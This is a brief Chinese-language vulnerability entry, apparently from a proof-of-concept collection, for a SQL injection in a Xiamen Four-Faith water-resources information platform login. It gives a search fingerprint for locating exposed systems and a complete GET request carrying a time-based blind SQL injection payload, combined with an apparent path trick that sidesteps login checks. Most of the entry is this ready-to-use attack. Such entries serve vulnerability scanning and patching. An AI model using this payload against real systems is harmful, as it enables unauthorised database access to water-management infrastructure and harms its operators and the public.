# 厦门四信通信科技userLogin存在SQL注入漏洞

厦门四信通信科技 ｜ SQL注入 ｜ —
- **指纹**：`title="水利信息化平台V2.2登录页面"`
- **请求**：`GET /stAlarmSmsSendLog/index.do;userLogin.do;?phone_query=%27%20AND%20(SELECT%209908%20FROM%20(SELECT(SLEEP(3)))Ikoi)--%20Bbtb HTTP/1.1`
- **响应特征**：200